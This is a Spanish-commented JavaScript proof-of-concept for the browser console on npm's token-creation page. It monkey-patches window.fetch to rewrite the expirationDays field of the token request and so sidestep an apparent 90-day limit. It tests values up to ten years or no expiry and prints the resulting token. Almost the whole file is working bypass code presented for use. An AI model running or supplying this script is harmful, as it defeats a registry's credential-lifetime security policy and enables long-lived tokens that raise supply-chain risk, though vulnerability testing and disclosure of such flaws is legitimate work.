// ================================================================
// PoC: Bypass multi-valor - prueba varios expirationDays
// MÉTODO: Intercepta y modifica el primer submit del formulario
//
// INSTRUCCIONES:
// 1. Ir a https://www.npmjs.com/settings/{tu-usuario}/tokens/new
// 2. Pegar este script en la consola
// 3. Escribir en consola: setBypassDays(365)   (o 180, 730, 3650)
// 4. Llenar y enviar el formulario normalmente
// 5. Revisar consola para resultado
//
// Para probar otro valor, llamar setBypassDays(NUEVO_VALOR) antes
// de cada submit del formulario.
// ================================================================

console.log("=== Token Bypass Multi-Value ===\n");

const _origFetch = window.fetch;
let _targetDays = null;
let _testLog = [];

window.setBypassDays = function(days) {
    _targetDays = String(days);
    console.log(`[OK] Próximo token se creará con expirationDays=${_targetDays}`);
    console.log(`[OK] Ahora llena el formulario y haz click en Generate Token.`);
};

window.fetch = async function(...args) {
    let [url, options] = args;

    const isTokenPost = typeof url === 'string' &&
        (url.includes('/tokens/new') || url.includes('/tokens/new-gat')) &&
        options?.method?.toUpperCase() === 'POST' &&
        options?.body;

    if (isTokenPost && _targetDays) {
        try {
            let body = JSON.parse(typeof options.body === 'string' ? options.body : '{}');
            const original = body.expirationDays;
            body.expirationDays = _targetDays;

            console.log(`\n[INTERCEPT] ${original} → ${_targetDays}`);
            console.log(`[INTERCEPT] URL: ${url}`);
            console.log(`[INTERCEPT] Body:`, body);

            options = { ...options, body: JSON.stringify(body) };
        } catch(e) {
            console.log(`[ERROR] Parse: ${e.message}`);
        }
    }

    const response = await _origFetch.call(this, url || args[0], options || args[1]);

    if (isTokenPost && _targetDays) {
        const cloned = response.clone();
        try {
            const ct = cloned.headers.get('content-type') || '';
            let result = { status: response.status, days: _targetDays };

            if (ct.includes('json')) {
                const data = await cloned.json();
                result.data = data;
                result.hasToken = !!data.newToken;
                result.token = data.newToken || null;

                if (data.newToken) {
                    console.log(`\n[!!!] ÉXITO: Token creado con ${_targetDays} días`);
                    console.log(`[!!!] Token: ${data.newToken}`);
                    console.log(`[!!!] BYPASS CONFIRMADO si ${_targetDays} > 90`);
                } else if (response.status === 200) {
                    console.log(`\n[?] HTTP 200 sin newToken - revisar:`, data);
                } else {
                    console.log(`\n[X] Rechazado HTTP ${response.status}:`, data);
                }
            } else {
                const text = await cloned.text();
                result.text = text.substring(0, 300);
                console.log(`\n[X] Respuesta no-JSON HTTP ${response.status}: ${text.substring(0, 300)}`);
            }

            _testLog.push(result);
            console.log(`\n[LOG] Tests realizados: ${_testLog.length}`);
            _testLog.forEach((t, i) => {
                console.log(`  #${i+1}: days=${t.days}, status=${t.status}, hasToken=${t.hasToken || false}`);
            });

            // Reset para siguiente test
            _targetDays = null;
            console.log(`\n[OK] Interceptor reseteado. Usar setBypassDays(N) para otro test.`);

        } catch(e) {
            console.log(`[ERROR] Response: ${e.message}`);
        }
    }

    return response;
};

console.log("[OK] Interceptor multi-valor instalado.");
console.log("");
console.log("USO:");
console.log("  setBypassDays(180)  → Probar 180 días");
console.log("  setBypassDays(365)  → Probar 365 días (1 año)");
console.log("  setBypassDays(730)  → Probar 730 días (2 años)");
console.log("  setBypassDays(3650) → Probar 3650 días (10 años)");
console.log("  setBypassDays(0)    → Probar sin expiración");
console.log("");
console.log("Después de cada setBypassDays(), llena y envía el formulario.");
console.log("Para restaurar: window.fetch = _origFetch");
